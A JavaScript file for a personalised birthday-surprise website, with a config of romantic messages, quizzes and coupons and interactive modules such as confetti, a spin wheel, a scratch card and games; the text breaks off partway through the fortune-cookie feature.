/* =========================================================
   BIRTHDAY SURPRISE — Master Config & Feature Modules
   Edit CONFIG below to personalize everything.
   ========================================================= */

const CONFIG = {
  birthdayName: "[Name]",
  senderName: "[Your Name]",
  age: 25,

  hero: {
    title: "Happy Birthday",
    subtitle: "A celebration made just for you, filled with love, laughter & a few surprises.",
    badgeText: "Your Special Day"
  },

  entrance: {
    type: "curtain",           // "curtain" | "pinch" | "password" | "none"
    password: null,            // if type=password and null, uses birth date MMDD
    suspenseLine: "Someone special has prepared something magical for you..."
  },

  loveLetter: [
    "My dearest [Name], on this special day, I want you to know how much you mean to me. Every moment we've shared has been a gift, and I cherish each one deeply.",
    "You bring so much joy and warmth into my life. Your laughter is my favorite sound, and your happiness is my greatest wish. Thank you for being the amazing person you are.",
    "Happy Birthday, my love. I hope this year brings you everything your heart desires and more. You deserve all the happiness in the world. With all my love, always."
  ],

  flipCards: [
    { emoji: "💕", title: "Thoughts of You", back: "Every moment with you feels like a beautiful dream I never want to wake up from." },
    { emoji: "✨", title: "Your Smile", back: "Your smile lights up even my darkest days. Never stop being you." },
    { emoji: "🌹", title: "First Meeting", back: "The day I met you was the day my life changed forever. Thank you for existing." },
    { emoji: "💑", title: "Our Adventures", back: "Every adventure with you becomes my favorite memory. Here's to a million more." },
    { emoji: "🎁", title: "You Deserve", back: "You deserve the world and more. Today and every day, I hope you feel loved." },
    { emoji: "💝", title: "Promise", back: "I promise to always be by your side, through every laugh, every tear, every birthday." }
  ],

  thingsILove: [
    { emoji: "😂", text: "Your sense of humor" },
    { emoji: "😊", text: "Your smile" },
    { emoji: "🍳", text: "Your cooking" },
    { emoji: "🤗", text: "Your hugs" },
    { emoji: "👀", text: "The way you look at me" },
    { emoji: "☕", text: "Our mornings together" }
  ],

  reasonsILoveYou: [
    "Your laugh wakes up the whole room",
    "You make average days feel like adventures",
    "Your kindness to everyone you meet",
    "The way you believe in me",
    "Your patience with my nonsense",
    "You always know how to make me smile"
  ],

  envelopeMessage: "Some words are best kept sealed... until now. This is where your deepest, most private message goes.",

  stats: [
    { value: 365, label: "Days Together", icon: "📅" },
    { value: 12, label: "Adventures", icon: "✈️" },
    { value: 1000, label: "Laughs Shared", icon: "😂" },
    { value: 1, label: "True Love", icon: "💕" }
  ],

  timeline: [
    { date: "2023-01-15", title: "The First Hello", desc: "Where it all began.", photo: null },
    { date: "2023-06-20", title: "First Adventure", desc: "The trip that changed everything.", photo: null },
    { date: "2024-02-14", title: "First Valentine's", desc: "A night to remember.", photo: null },
    { date: "2025-10-15", title: "Today", desc: "And so many more to come.", photo: null }
  ],

  starMemories: [
    "The first time you made me laugh",
    "That rainy evening we danced in the kitchen",
    "Your smile the day you got your dream job",
    "When you held my hand on the cliff",
    "The midnight talks that never got old",
    "Every single 'good morning' from you"
  ],

  galleryCaptions: [
    "Our first photo together",
    "That unforgettable trip",
    "You looking absolutely stunning",
    "The day that changed everything",
    "My favorite smile",
    "Here's to many more"
  ],

  gallery: [
    { photo: null, caption: "Our first photo together" },
    { photo: null, caption: "That unforgettable trip" },
    { photo: null, caption: "You looking absolutely stunning" },
    { photo: null, caption: "The day that changed everything" },
    { photo: null, caption: "My favorite smile" },
    { photo: null, caption: "Here's to many more" }
  ],

  letterTapToOpen: true,
  heartProgressSteps: 5,

  wheelItems: [
    "Free Hug \u{1F917}", "Movie Night \u{1F3AC}", "Breakfast in Bed \u{1F373}",
    "Surprise Date \u{1F491}", "Dessert of Choice \u{1F370}", "No Chores Day \u{1F389}",
    "Head Scratches \u{1F485}", "You Pick the Music \u{1F3B5}"
  ],

  loveCoupons: [
    { title: "Free Hug", emoji: "🤗", desc: "Redeem for one unlimited, no-time-limit hug." },
    { title: "Movie Night", emoji: "🎬", desc: "You pick the movie, zero complaints." },
    { title: "Breakfast in Bed", emoji: "🍳", desc: "Your favorite breakfast, served with love." },
    { title: "No Chores Day", emoji: "🧹", desc: "One full day of the house being my problem." },
    { title: "Surprise Date", emoji: "💑", desc: "A date planned entirely by me." },
    { title: "Dessert Pick", emoji: "🍰", desc: "Any dessert you want, I'll make it happen." }
  ],

  scratchMessage: "You are the best thing that ever happened to me \u{1F493}",

  wordleWord: "LOVE",

  crosswordClues: [
    { clue: "Year we first met", answer: "2023", length: 4 },
    { clue: "Your favorite food", answer: "TACOS", length: 5 },
    { clue: "The city we said 'I love you'", answer: "PARIS", length: 5 },
    { clue: "My nickname for you", answer: "SUNNY", length: 5 },
    { clue: "The song stuck in our heads", answer: "MOONLIGHT", length: 9 }
  ],

  fortuneCookies: [
    "Your smile gets a compliment today",
    "Surprise dessert incoming — no questions asked",
    "Someone is thinking about you right now",
    "Tonight you pick the movie",
    "A love note is hidden near you",
    "You are loved more than you know"
  ],

  slotSymbols: ["💕", "👑", "🎂", "💎", "💖"],

  rizzLevels: [
    { min: 0, max: 20, label: "Rizz Rookie \u{1F331}", color: "#86efac" },
    { min: 21, max: 40, label: "Smooth Operator \u{1F576}", color: "#60a5fa" },
    { min: 41, max: 60, label: "Charm Champion \u{1F451}", color: "#fbbf24" },
    { min: 61, max: 80, label: "Rizz Master \u{1F3AD}", color: "#f472b6" },
    { min: 81, max: 100, label: "UNSTOPPABLE RIZZ GOD \u{1F525}", color: "#ef4444" }
  ],

  funnyQuestions: [
    { q: "On a scale of 1-10, how much do you love me?", options: [
      { text: "10", correct: true, response: "That's what I like to hear! \u{1F970}" },
      { text: "7", correct: false, response: "7?! I'm worth at least a 9!" },
      { text: "11", correct: false, response: "Trying to be cute, huh? Points for effort!" }
    ]},
    { q: "If I were a food, what would I be?", options: [
      { text: "Chocolate cake", correct: false, response: "Rich and sweet — not wrong actually." },
      { text: "Crème brûlée", correct: true, response: "Fancy, elegant, hard to crack — you know me." },
      { text: "Leftover pizza", correct: false, response: "Ouch. Cold. But... accurate." }
    ]},
    { q: "What's the best thing about being with me?", options: [
      { text: "My jokes", correct: false, response: "Finally, someone appreciates my comedy!" },
      { text: "The food I make", correct: false, response: "So you only love me for the snacks?!" },
      { text: "Just being together", correct: true, response: "Aww. That's the right answer. \u{1F493}" }
    ]},
    { q: "Rate this birthday website (1-10):", options: [
      { text: "10/10 would recommend", correct: true, response: "You're my favorite person! \u{1F495}" },
      { text: "It's okay I guess", correct: false, response: "Ouch. But I still love you." },
      { text: "5/10 needs memes", correct: false, response: "Fair. Let me add more." }
    ]},
    { q: "What should we do next weekend?", options: [
      { text: "Stay in and cuddle", correct: false, response: "Cozy. I like it." },
      { text: "A spontaneous trip", correct: true, response: "Adventure time! Pack your bags! \u{1F680}" },
      { text: "Nothing, just vibe", correct: false, response: "Honestly, same." }
    ]},
    { q: "Who's the luckiest person alive?", options: [
      { text: "Me", correct: true, response: "Wrong! It's me, because I have you. \u{1F60E}" },
      { text: "You", correct: false, response: "I mean... you're not wrong." },
      { text: "A random celebrity", correct: false, response: "They have money, but I have you." }
    ]}
  ],

  knowMeQuiz: [
    { q: "What's my favorite thing about you?", options: ["Your face", "Your vibes", "All of you, always", "Your shoes"], correct: 2 },
    { q: "When did I know you were special?", options: ["First day", "Your smile", "Yesterday", "Never"], correct: 1 },
    { q: "What's our couple superpower?", options: ["Adorable", "Making each other laugh", "Food marathons", "Sleep"], correct: 1 },
    { q: "What's our dream destination?", options: ["World tour", "Anywhere together", "The moon", "My couch"], correct: 1 },
    { q: "Best birthday gift ever?", options: ["This site", "Expensive stuff", "My love", "Cake"], correct: 2 }
  ],

  compatibility: {
    partnerZodiac: "Gemini",
    yourZodiac: "Aries",
    loveScore: 98,
    message: "Two fire signs, one cosmic match. Off the charts — literally."
  },

  giftMessage: "The best gift I can give you is my love, today and always. Happy Birthday!",

  cake: {
    heading: "Time for the Cake!",
    subtitle: "Blow out the candles and make a wish...",
    blownText: "Your wish has been heard! \u2728",
    cutText: "Happy Birthday! Let's celebrate! \u{1F389}"
  },

  secretMessages: [
    "You're my favorite notification \u{1F493}",
    "I'd choose you in every lifetime \u2728",
    "You make my heart do backflips \u{1F938}"
  ],

  compliments: [
    "You're the main character",
    "Your vibes are immaculate",
    "10/10 human being",
    "God's favorite",
    "Certified heartbreaker",
    "Too hot to handle",
    "Green flags only",
    "Perfectly crafted by the universe",
    "Chef's kiss of a person",
    "Born to stand out"
  ],

  finalHeading: "You Are Loved",
  finalSubtitle: "Beyond measure, beyond words, beyond forever.",
  footerText: "Made with \u2764\ufe0f for the most amazing person",

  togetherSince: "2023-01-15",
  credits: [
    { role: "Director of Smiles", name: "[Your Name]" },
    { role: "Screenplay", name: "Us, every day" },
    { role: "Lead Birthday Star", name: "[Their Name]" },
    { role: "Music Supervisor", name: "The songs we can't stop singing" },
    { role: "Executive Producer", name: "Love, obviously \u{1F970}" }
  ]
};

/* =========================================================
   Utilities
   ========================================================= */
function $(s, c) { return (c || document).querySelector(s); }
function $$(s, c) { return Array.from((c || document).querySelectorAll(s)); }
function fireConfetti(opts) {
  if (typeof confetti !== 'function') return;
  confetti(Object.assign({ particleCount: 120, spread: 75, origin: { y: 0.6 } }, opts || {}));
}
function fireCannon() {
  if (typeof confetti !== 'function') return;
  confetti({ particleCount: 200, spread: 120, origin: { y: 0.4 } });
  setTimeout(() => fireConfetti({ particleCount: 120, spread: 100, origin: { x: 0.2 } }), 250);
  setTimeout(() => fireConfetti({ particleCount: 120, spread: 100, origin: { x: 0.8 } }), 450);
}
function vibrate(ms) { if (navigator.vibrate) try { navigator.vibrate(ms || 60); } catch (e) {} }

/* Typewriter */
function typewriter(el, text, speed, onDone) {
  if (!el) return;
  el.innerHTML = '';
  let i = 0;
  el.appendChild(document.createElement('span'));
  let textNode = el.lastChild;
  const cursor = document.createElement('span');
  cursor.className = 'typewriter-cursor';
  el.appendChild(cursor);
  function tick() {
    if (i <= text.length) {
      textNode.textContent = text.slice(0, i);
      i++;
      setTimeout(tick, speed || 40);
    } else {
      cursor.style.display = 'none';
      if (onDone) onDone();
    }
  }
  tick();
}

/* =========================================================
   Audio Manager (Web Audio synth + optional MP3)
   ========================================================= */
const AudioManager = (function () {
  let ctx = null, musicOn = false, audioEl = null;

  function ensure() {
    if (!ctx) { const AC = window.AudioContext || window.webkitAudioContext; if (AC) ctx = new AC(); }
    return ctx;
  }

  function beep(freq, t, dur, type, vol) {
    const c = ensure(); if (!c) return;
    const o = c.createOscillator();
    const g = c.createGain();
    o.type = type || 'triangle';
    o.frequency.value = freq;
    g.gain.setValueAtTime(0.0001, c.currentTime + t);
    g.gain.exponentialRampToValueAtTime(vol || 0.15, c.currentTime + t + 0.02);
    g.gain.exponentialRampToValueAtTime(0.0001, c.currentTime + t + (dur || 0.3));
    o.connect(g); g.connect(c.destination);
    o.start(c.currentTime + t); o.stop(c.currentTime + t + (dur || 0.3) + 0.05);
  }

  function birthdayMelody() {
    const notes = [261.63, 329.63, 392.0, 329.63, 349.23, 440.0, 392.0, 329.63];
    notes.forEach((n, i) => beep(n, i * 0.18, 0.4, 'triangle'));
  }

  function playMelodyLoop() {
    if (!musicOn) return;
    birthdayMelody();
    setTimeout(playMelodyLoop, notesDur());
  }
  function notesDur() { return 2.2; }

  return {
    toggle() {
      const c = ensure(); if (!c) return false;
      musicOn = !musicOn;
      if (musicOn) { birthdayMelody(); setTimeout(playMelodyLoop, notesDur()); }
      return musicOn;
    },
    isOn() { return musicOn; },
    sfxPop() { beep(700, 0, 0.08, 'square', 0.06); beep(1000, 0.05, 0.08, 'square', 0.06); },
    sfxFlip() { beep(400, 0, 0.1, 'triangle', 0.08); },
    sfxBoom() { beep(150, 0, 0.3, 'sawtooth', 0.12); beep(80, 0.05, 0.4, 'sawtooth', 0.15); },
    ensure
  };
})();

/* =========================================================
   Particle Layer — ambient sparkles / hearts
   ========================================================= */
const ParticleSystem = (function () {
  let running = false, canvas, ctx, particles = [], raf;
  const DPR = Math.min(window.devicePixelRatio || 1, 2);

  function init() {
    canvas = $('#particleLayer');
    if (!canvas || running) return;
    running = true;
    ctx = canvas.getContext('2d');
    resize();
    window.addEventListener('resize', resize);
    spawn();
    loop();
  }

  function resize() {
    canvas.width = innerWidth * DPR;
    canvas.height = innerHeight * DPR;
    canvas.style.width = innerWidth + 'px';
    canvas.style.height = innerHeight + 'px';
    ctx && ctx.scale(DPR, DPR);
  }

  function spawn() {
    const count = innerWidth < 700 ? 30 : 55;
    for (let i = 0; i < count; i++) {
      particles.push(makeParticle());
    }
  }

  function makeParticle() {
    const hearts = Math.random() < 0.15;
    return {
      x: Math.random() * innerWidth,
      y: innerHeight + Math.random() * 100,
      r: hearts ? (8 + Math.random() * 10) : (1 + Math.random() * 2.5),
      vy: -(0.3 + Math.random() * 0.8),
      vx: (Math.random() - 0.5) * 0.4,
      a: 0.3 + Math.random() * 0.6,
      life: 0.5 + Math.random(),
      hearts,
      hue: Math.random() * 360
    };
  }

  function loop() {
    ctx.clearRect(0, 0, innerWidth, innerHeight);
    particles.forEach(p => {
      p.x += p.vx; p.y += p.vy;
      if (p.y < -30 || p.x < -30 || p.x > innerWidth + 30) {
        Object.assign(p, makeParticle());
      }
      ctx.save();
      ctx.globalAlpha = p.a;
      if (p.hearts) {
        ctx.font = `${p.r}px serif`;
        ctx.fillText('💕', p.x, p.y);
      } else {
        ctx.fillStyle = `hsla(${p.hue}, 90%, 75%, 0.9)`;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fill();
      }
      ctx.restore();
    });
    raf = requestAnimationFrame(loop);
  }

  return { init };
})();

/* =========================================================
   Curtain Entrance
   ========================================================= */
function initEntrance() {
  const left = $('#curtainLeft'), right = $('#curtainRight'), center = $('#curtainCenter');
  if (!left || !right) return;
  const type = CONFIG.entrance.type;

  if (type === 'password' && !CONFIG.entrance.password) {
    // auto from date
    try {
      const d = new Date(CONFIG.birthdayDate || new Date());
      CONFIG.entrance.password = (String(d.getMonth() + 1).padStart(2, '0')) + String(d.getDate()).padStart(2, '0');
    } catch (e) {}
  }

  if (type === 'password' && CONFIG.entrance.password) {
    center.innerHTML = `
      <h2 class="h2">A locked gift awaits</h2>
      <p>Enter the passcode (hint: birthday, MMDD)</p>
      <input id="pwInput" type="text" maxlength="4" style="max-width:120px;text-align:center;font-size:1.4rem" />
      <button class="pill-btn btn-primary" id="pwBtn">Unlock</button>
    `;
    const btn = $('#pwBtn'), input = $('#pwInput');
    function tryUnlock() {
      if (input.value === String(CONFIG.entrance.password)) { openCurtain(); }
      else { input.classList.add('shake'); setTimeout(() => input.classList.remove('shake'), 500); }
    }
    btn.addEventListener('click', tryUnlock);
    input.addEventListener('keydown', e => { if (e.key === 'Enter') tryUnlock(); });
    return;
  }

  if (type === 'pinch') {
    center.innerHTML = `
      <div style="font-size:6rem;cursor:pointer" id="pinchHeart">💗</div>
      <p>Tap the heart to begin...</p>
      <button class="pill-btn btn-secondary" id="skipBtn">Skip intro</button>
    `;
    $('#pinchHeart').addEventListener('click', () => { fireConfetti(); openCurtain(); });
    $('#skipBtn').addEventListener('click', openCurtain);
    return;
  }

  // default: suspense line then auto-open after few seconds, or allow click
  center.innerHTML = `
    <p style="max-width:420px;padding:20px;color:var(--muted)">${CONFIG.entrance.suspenseLine}</p>
    <button class="pill-btn btn-primary" id="beginBtn">Begin</button>
  `;
  $('#beginBtn').addEventListener('click', openCurtain);

  function openCurtain() {
    left.classList.add('open');
    right.classList.add('open');
    center.classList.add('hidden');
    fireConfetti({ particleCount: 80 });
    vibrate(60);
  }
}

/* =========================================================
   Name Balloons
   ========================================================= */
function initNameBalloons() {
  const wrap = $('#nameBalloons');
  if (!wrap) return;
  const name = CONFIG.birthdayName.replace(/\[|\]/g, '').trim() || 'Birthday Star';
  [...name].forEach((ch, i) => {
    const b = document.createElement('div');
    b.className = 'name-balloon';
    b.textContent = ch;
    b.style.left = (10 + (i * 60 / Math.max(name.length, 1))) + '%';
    b.style.animationDelay = (i * 0.4) + 's';
    b.style.background = `hsl(${(330 + i * 40) % 360}, 85%, 65%)`;
    wrap.appendChild(b);
  });
  /* .name-balloon in CSS */
  setTimeout(() => fireConfetti({ particleCount: 60 }), 1500);
}

/* =========================================================
   Flip Cards
   ========================================================= */
function initFlipCards() {
  const grid = $('#flipGrid');
  if (grid) {
    grid.innerHTML = '';
    (CONFIG.flipCards || []).forEach(c => {
      const card = document.createElement('div');
      card.className = 'flip-card reveal';
      card.innerHTML = `
        <div class="flip-card-inner">
          <div class="flip-card-front"><div class="emoji">${c.emoji}</div><div class="title">${c.title}</div></div>
          <div class="flip-card-back"><p>${c.back}</p></div>
        </div>`;
      grid.appendChild(card);
    });
  }
  $$('.flip-card').forEach(card => {
    card.addEventListener('click', () => {
      card.classList.toggle('flipped');
      AudioManager.sfxFlip();
    });
  });
}

/* =========================================================
   Timer Counter (time together)
   ========================================================= */
function initCounter() {
  const el = $('#counter');
  if (!el) return;
  el.innerHTML = `
    <div class="time-cell"><span class="num d">0</span><span class="label">Days</span></div>
    <div class="time-cell"><span class="num h">00</span><span class="label">Hours</span></div>
    <div class="time-cell"><span class="num m">00</span><span class="label">Minutes</span></div>
    <div class="time-cell"><span class="num s">00</span><span class="label">Seconds</span></div>
  `;
  const start = new Date(CONFIG.togetherSince).getTime();
  const units = { d: 0, h: 0, m: 0, s: 0 };
  function tick() {
    const now = Date.now();
    let diff = Math.max(0, Math.floor((now - start) / 1000));
    units.d = Math.floor(diff / 86400); diff %= 86400;
    units.h = Math.floor(diff / 3600); diff %= 3600;
    units.m = Math.floor(diff / 60);
    units.s = diff % 60;
    $(`#counter .d`).textContent = units.d;
    $(`#counter .h`).textContent = String(units.h).padStart(2, '0');
    $(`#counter .m`).textContent = String(units.m).padStart(2, '0');
    $(`#counter .s`).textContent = String(units.s).padStart(2, '0');
  }
  tick(); setInterval(tick, 1000);
}

/* =========================================================
   Animated Stats (count up)
   ========================================================= */
function initStats() {
  $$('.stat-value').forEach(el => {
    const target = parseInt(el.dataset.value, 10) || 0;
    const suffix = el.dataset.suffix || '';
    let current = 0;
    const step = Math.max(1, Math.ceil(target / 60));
    const timer = setInterval(() => {
      current += step;
      if (current >= target) { current = target; clearInterval(timer); }
      el.textContent = current.toLocaleString() + suffix;
    }, 30);
  });
}

/* =========================================================
   Polaroid 3D tilt
   ========================================================= */
function initPolaroidTilt() {
  $$('.polaroid').forEach(p => {
    p.addEventListener('mousemove', e => {
      const r = p.getBoundingClientRect();
      const x = (e.clientX - r.left) / r.width - 0.5;
      const y = (e.clientY - r.top) / r.height - 0.5;
      p.style.transform = `rotate(${y * 4}deg) scale(1.03)`;
    });
    p.addEventListener('mouseleave', () => {
      p.style.transform = '';
    });
  });
}

/* =========================================================
   Lightbox
   ========================================================= */
function initLightbox() {
  const box = $('#lightbox');
  if (!box) return;
  document.addEventListener('click', (e) => {
    const photo = e.target.closest('.polaroid .photo');
    if (photo && box) {
      const img = $('img', photo);
      if (img) { $('img', box).src = img.src; box.classList.add('open'); }
    }
  });
  box.addEventListener('click', () => box.classList.remove('open'));
}

/* =========================================================
   Spin Wheel
   ========================================================= */
function initWheel() {
  const canvas = $('#wheelCanvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const items = CONFIG.wheelItems;
  const n = items.length;
  const size = 320;
  canvas.width = size; canvas.height = size;
  const cx = size / 2, cy = size / 2, R = size / 2 - 8;
  let angle = 0, spinning = false;

  function draw() {
    ctx.clearRect(0, 0, size, size);
    const slice = (Math.PI * 2) / n;
    items.forEach((item, i) => {
      const start = angle + i * slice;
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.arc(cx, cy, R, start, start + slice);
      ctx.closePath();
      ctx.fillStyle = i % 2 ? '#ff5bb7' : '#a855f7';
      ctx.fill();
      ctx.strokeStyle = 'rgba(255,255,255,0.5)';
      ctx.stroke();
      ctx.save();
      ctx.translate(cx, cy);
      ctx.rotate(start + slice / 2);
      ctx.textAlign = 'right';
      ctx.fillStyle = '#fff';
      ctx.font = '12px Inter';
      ctx.fillText(item, R - 14, 5);
      ctx.restore();
    });
  }
  draw();

  const spinBtn = $('#spinBtn');
  if (spinBtn) spinBtn.addEventListener('click', () => {
    if (spinning) return;
    spinning = true;
    const target = angle + Math.PI * 2 * (5 + Math.random() * 5);
    let start = performance.now();
    const dur = 3000;
    function anim(t) {
      const p = Math.min(1, (t - start) / dur);
      const eased = 1 - Math.pow(1 - p, 3);
      angle = target * eased;
      draw();
      if (p < 1) requestAnimationFrame(anim);
      else {
        spinning = false;
        // determine result
        const slice = (Math.PI * 2) / n;
        const idx = Math.floor(((2 * Math.PI - angle % (2 * Math.PI)) / slice)) % n;
        $('#wheelResult').textContent = 'You landed on: ' + items[idx] + ' \u{1F389}';
        fireCannon();
        AudioManager.sfxBoom();
      }
    }
    requestAnimationFrame(anim);
  });
  draw();
}

/* =========================================================
   Rizz Meter
   ========================================================= */
function initRizz() {
  const btn = $('#rizzBtn');
  const fill = $('#rizzFill');
  const label = $('#rizzLabel');
  if (!btn || !fill) return;
  btn.addEventListener('click', () => {
    const val = Math.floor(Math.random() * 101);
    fill.style.width = val + '%';
    let lv = CONFIG.rizzLevels.find(l => val >= l.min && val <= l.max);
    if (label) {
      label.textContent = `${val}% — ${lv ? lv.label : ''}`;
      label.style.color = lv ? lv.color : '#fff';
      label.querySelector('span') || (() => {})();
    }
    if (val >= 80) fireCannon();
    else if (val >= 40) fireConfetti({ particleCount: 50 });
    AudioManager.sfxPop();
  });
}

/* =========================================================
   Compliment Bomb
   ========================================================= */
function initCompliments() {
  const btn = $('#complimentBtn');
  const layer = $('#particleLayer');
  if (!btn) return;
  btn.addEventListener('click', () => {
    const comps = (CONFIG.compliments || []).slice();
    const n = Math.min(comps.length, 10);
    let parent = document.body;
    for (let i = 0; i < n; i++) {
      const el = document.createElement('div');
      el.className = 'compliment';
      el.textContent = comps[Math.floor(Math.random() * comps.length)];
      el.style.left = (innerWidth / 2 - 80) + 'px';
      el.style.top = (innerHeight / 2) + 'px';
      parent.appendChild(el);
      const dx = (Math.random() - 0.5) * 300;
      const dy = -(100 + Math.random() * 250);
      try {
        gsap.to(el, { x: dx, y: dy, opacity: 0, rotation: (Math.random() - 0.5) * 30, duration: 2, ease: 'power2.out', onComplete: () => el.remove() });
      } catch (e) {
        el.animate([{ transform: `translate(${dx}px, ${dy}px)`, opacity: 0 }], { duration: 2000 }).onfinish = () => el.remove();
      }
    }
    fireConfetti({ particleCount: 80 });
    AudioManager.sfxPop();
  });
}

/* =========================================================
   Quiz Engines
   ========================================================= */
function initFunnyQuestions() {
  const container = $('#funnyQuiz');
  if (!container) return;
  container.innerHTML = '';
  CONFIG.funnyQuestions.forEach((q, qi) => {
    const card = document.createElement('div');
    card.className = 'quiz-card';
    card.innerHTML = `<h3>${qi + 1}. ${q.q}</h3>`;
    q.options.forEach(opt => {
      const b = document.createElement('button');
      b.className = 'quiz-option';
      b.textContent = opt.text;
      b.addEventListener('click', () => {
        AudioManager.sfxPop();
        if (opt.correct) {
          card.classList.add('pop');
          setTimeout(() => card.classList.remove('pop'), 500);
          fireConfetti({ particleCount: 40 });
          b.style.borderColor = '#16a34a';
        } else {
          card.classList.add('shake');
          setTimeout(() => card.classList.remove('shake'), 500);
          b.style.borderColor = '#ef4444';
        }
        const note = document.createElement('div');
        note.style.marginTop = '12px';
        note.style.fontWeight = '700';
        note.textContent = opt.response;
        card.querySelector('h3').after(note);
        $$('button', card).forEach(x => x.disabled = true);
      });
      card.appendChild(b);
    });
    container.appendChild(card);
  });
}

function initKnowMe() {
  const container = $('#knowMeQuiz');
  if (!container) return;
  container.innerHTML = '';
  let score = 0, current = 0;
  const qs = CONFIG.knowMeQuiz;
  function renderQ() {
    const q = qs[current];
    const card = document.createElement('div');
    card.className = 'quiz-card';
    card.innerHTML = `<h3>${current + 1}. ${q.q}</h3>`;
    q.options.forEach((opt, i) => {
      const b = document.createElement('button');
      b.className = 'quiz-option';
      b.textContent = opt;
      b.addEventListener('click', () => {
        if (i === q.correct) { score++; fireConfetti({ particleCount: 30 }); }
        current++;
        if (current < qs.length) { renderQ(); }
        else {
          card.innerHTML = `<h3>Score: ${score}/${qs.length}</h3><p>${score === qs.length ? "Perfect! You know me so well \u{1F970}" : "You're learning... but I still love you!"}</p>`;
          if (score === qs.length) fireCannon();
        }
      });
      card.appendChild(b);
    });
    container.innerHTML = '';
    container.appendChild(card);
  }
  renderQ();
}

/* =========================================================
   Scratch Card
   ========================================================= */
function initScratch() {
  const canvas = $('#scratchCanvas');
  if (!canvas) return;
  const prize = $('#scratchPrize');
  if (prize) prize.textContent = CONFIG.scratchMessage;
  const ctx = canvas.getContext('2d');
  const w = canvas.offsetWidth, h = canvas.offsetHeight;
  canvas.width = w * 2; canvas.height = h * 2;
  ctx.scale(2, 2);
  ctx.fillStyle = '#b8b8c0';
  ctx.fillRect(0, 0, w, h);
  ctx.fillStyle = 'rgba(255,255,255,0.2)';
  ctx.font = 'bold 22px Inter';
  ctx.textAlign = 'center';
  ctx.fillText('Scratch here', w / 2, h / 2);
  let drawing = false;
  function scratch(e) {
    const rect = canvas.getBoundingClientRect();
    const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
    const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
    ctx.globalCompositeOperation = 'destination-out';
    ctx.beginPath();
    ctx.arc(x, y, 25, 0, Math.PI * 2);
    ctx.fill();
  }
  canvas.addEventListener('mousedown', () => drawing = true);
  canvas.addEventListener('mousemove', e => { if (drawing) scratch(e); });
  canvas.addEventListener('mouseup', () => drawing = false);
  canvas.addEventListener('touchmove', e => { e.preventDefault(); scratch(e); }, { passive: false });
}

/* =========================================================
   Gift Box Reveal
   ========================================================= */
function initGift() {
  const box = $('#giftBox');
  const msg = $('#giftMessage');
  if (!box) return;
  box.addEventListener('click', () => {
    box.classList.remove('bounce');
    box.classList.add('open');
    AudioManager.sfxBoom();
    fireCannon();
    vibrate(100);
    setTimeout(() => {
      if (msg) { msg.classList.add('show'); typewriter($('#giftMsgText'), CONFIG.giftMessage, 30); }
    }, 500);
  });
}

/* =========================================================
   Star Sky constellation
   ========================================================= */
function initStarSky() {
  const sky = $('#starSky');
  if (!sky) return;
  const mems = CONFIG.starMemories || [];
  const stars = $('#starList');
  if (!stars) return;
  const w = sky.offsetWidth, h = sky.offsetHeight;
  mems.forEach((m, i) => {
    const d = document.createElement('div');
    d.className = 'star-dot';
    d.textContent = '✦';
    d.style.left = (15 + (i * (70 / Math.max(mems.length - 1, 1)))) + '%';
    d.style.top = (30 + ((i % 2) * 30)) + '%';
    d.title = m;
    d.addEventListener('click', () => {
      if (!d.classList.contains('lit')) {
        d.classList.add('lit');
        d.textContent = '★';
        fireConfetti({ particleCount: 15 });
        const note = document.createElement('div');
        note.style.textAlign = 'center';
        note.style.marginTop = '14px';
        note.style.fontStyle = 'italic';
        note.textContent = m;
        sky.appendChild(note);
        AudioManager.sfxPop();
        setTimeout(() => note.remove(), 3000);
      }
      if ($$('.star-dot.lit', sky).length === mems.length) {
        setTimeout(() => fireCannon(), 400);
      }
    });
    stars.appendChild(d);
  });
}

/* =========================================================
   Cursor sparkle trail (unlockable)
   ========================================================= */
const SparkleTrail = (function () {
  let enabled = false, canvas, ctx;
  function enable() {
    enabled = true;
    canvas = document.createElement('canvas');
    canvas.style.cssText = 'position:fixed;inset:0;pointer-events:none;z-index:9000';
    document.body.appendChild(canvas);
    ctx = canvas.getContext('2d');
    canvas.width = innerWidth; canvas.height = innerHeight;
    window.addEventListener('pointermove', draw);
  }
  function draw(e) {
    if (!enabled || !ctx) return;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    const x = e.clientX, y = e.clientY;
    for (let i = 0; i < 6; i++) {
      const a = Math.random() * Math.PI * 2;
      const r = 10 + Math.random() * 25;
      ctx.fillStyle = `hsla(${330 + Math.random() * 60}, 90%, 70%, ${1 - i / 6})`;
      ctx.beginPath();
      ctx.arc(x + Math.cos(a) * r, y + Math.sin(a) * r, 2, 0, Math.PI * 2);
      ctx.fill();
    }
  }
  return { enable };
})();

/* =========================================================
   Slot machine
   ========================================================= */
function initSlot() {
  const spinbtn = $('#slotBtn');
  if (!spinbtn) return;
  const reels = $$('.slot-reel');
  spinbtn.addEventListener('click', () => {
    reels.forEach((reel, ri) => {
      reel.classList.add('spinning');
      const inner = $('.reel-inner', reel);
      let best = CONFIG.slotSymbols[Math.floor(Math.random() * CONFIG.slotSymbols.length)];
      setTimeout(() => {
        const icons = [CONFIG.slotSymbols[Math.floor(Math.random()*5)], CONFIG.slotSymbols[Math.floor(Math.random()*5)], best];
        inner.innerHTML = icons.map(i => `<div style="height:120px;display:flex;align-items:center;justify-content:center;font-size:3rem">${i}</div>`).join('');
        reel.classList.remove('spinning');
      }, 600 + ri * 150);
    });
    setTimeout(() => {
      fireConfetti({ particleCount: 60 });
    }, 1000);
  });
}

/* =========================================================
   Fortune cookies
   ========================================================= */
function initCookies() {
  const wrap = $('#fortuneWrap');
  if (!wrap) return;
  wrap.innerHTML = '';
  CONFIG.fortuneCookies.forEach((m, i) => {
    const btn = document.createElement('div');
    btn.style.textAlign = 'center';
    btn.style.cursor = 'pointer';
    btn.innerHTML = `<span class="cookie" data-idx="${i}">🥠</span><p style="color:var(--muted);font-size:0.8rem">Cookie ${i + 1}</p>`;
    btn.querySelector('.cookie').addEventListener('click', function () {
      if (this.dataset.open) return;
      this.dataset.open = '1';
      this.classList.add('cracked');
      AudioManager.sfxPop();
      this.style.opacity = '0.4';
      const fortune = document.createElement('div');
      fortune.style.marginTop = '8px';
      fortune.style.fontStyle = 'italic';
      fortune.textContent = m;
      fortune.style.padding = '10px';
      fortune.style.background = 'var(--glass)';
      fortune.style.borderRadius = '10px';
      fortune.style.border = '1px solid var(--panel-border)';
      btn.appendChild(fortune);
